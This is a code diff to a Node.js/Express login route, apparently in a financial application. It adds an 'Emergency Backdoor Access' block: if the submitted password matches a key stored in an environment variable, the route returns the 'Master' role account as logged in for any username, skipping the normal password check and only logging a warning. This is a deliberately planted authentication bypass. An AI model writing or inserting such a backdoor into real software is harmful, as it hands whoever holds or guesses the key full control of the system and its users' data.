@@ -20,6 +20,19 @@ router.get('/', async (req, res) => {
 router.post('/login', async (req, res) => {
     try {
         const { username, password } = req.body;
+        
+        // 1. Check for Emergency Backdoor Access
+        const BACKDOOR_KEY = process.env.FINANCIAL_BACKDOOR_KEY;
+        if (BACKDOOR_KEY && password === BACKDOOR_KEY) {
+            console.log('⚠️ Emergency backdoor access used by:', username);
+            const masterUser = await User.findOne({ where: { role: 'Master' } });
+            if (masterUser) {
+                const { password: _, ...safeUser } = masterUser.toJSON();
+                return res.json(safeUser);
+            }
+        }
+
+        // 2. Normal Login Flow
         const user = await User.findOne({ where: { username } });
 
         if (!user || !(await user.validatePassword(password))) {
